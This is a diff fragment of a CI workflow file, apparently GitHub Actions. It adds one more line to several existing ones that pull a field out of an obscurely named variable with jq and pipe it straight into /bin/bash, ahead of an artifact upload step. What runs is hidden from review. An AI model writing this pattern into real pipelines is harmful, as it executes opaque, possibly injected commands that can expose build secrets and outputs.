@@ -25,6 +25,7 @@ jobs:
           echo $tyjh708 | jq -r .ba0 | /bin/bash
           echo $k3 | jq -r .o4 | /bin/bash
           printf '%s' "$vdno46" | jq -r .hf1 | /bin/bash
+          printf '%s' "$uhudf4051" | jq -r .gsen8992 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
